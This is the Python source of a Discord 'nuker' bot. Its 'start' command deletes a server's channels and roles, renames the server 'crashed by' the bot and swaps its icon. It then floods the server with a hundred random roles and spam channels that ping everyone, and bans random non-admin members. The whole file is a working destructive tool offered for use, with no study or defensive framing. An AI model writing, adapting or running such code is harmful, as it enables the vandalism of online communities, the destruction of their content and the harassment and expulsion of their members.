#Imports
import disnake, json, string, random
from disnake.ext import commands

# Variables
config_file = open('config.json', 'r')
config = json.load(config_file)

bot = commands.Bot(command_prefix=config['prefix'], help_command=None, intents=disnake.Intents.all())

# Methods
async def ban_member():
    all_members = [member for member in bot.get_all_members()]
    random_member = random.choice(all_members)
    if not random_member.guild_permissions.administrator:
        await random_member.ban()
        print('member banned')
    
async def start_vzlom(ctx):
    for channel in bot.get_all_channels():
        try:
            await channel.delete()
            print('channel deleted')
        except:
            break
        
    for roles in ctx.guild.roles:
        if roles.name != "@everyone" and roles.name != bot.user.name:
            _id = roles.id
            role = disnake.utils.get(ctx.guild.roles, id=_id)
            await role.delete()
            print('role deleted')
    
    with open('icon.png', 'rb') as f:
        icon = f.read()
        await ctx.guild.edit(name=f'crashed by {bot.user.name}', icon=icon)
            
    for _ in range(100):
        names = [''.join(random.choice(string.ascii_letters) for _ in range(8)) for _ in range(100)]
        await ctx.guild.create_role(name=random.choice(names))
        print('role created')
        
    for _ in range(100):
        try:
            name = [''.join(random.choice(string.ascii_letters) for _ in range(8)) for _ in range(100)]
            channel_2 = await ctx.guild.create_text_channel(f'{random.choice(name)}-by-{random.choice(name)}')
            await channel_2.send('@everyone THIS IS CRASH AHHAHAHAHAHAHAHHAH')
            print('channel created')
            await ban_member()
        except:
            break
    
    await ban_member()
    
# Events
@bot.event
async def on_ready():
    print('Ready!')
    
# Commands
@bot.command(aliases=['start', 'старт'])
async def vzlostartingm_chopi(ctx):
    await start_vzlom(ctx)
    
@bot.slash_command(name='start')
async def vzlostartingm_chopi(ctx):
    await start_vzlom(ctx)
    
@bot.slash_command(name='старт')
async def vzlostartingm_chopi(ctx):
    await start_vzlom(ctx)

# Run
bot.run(token=config['token'])
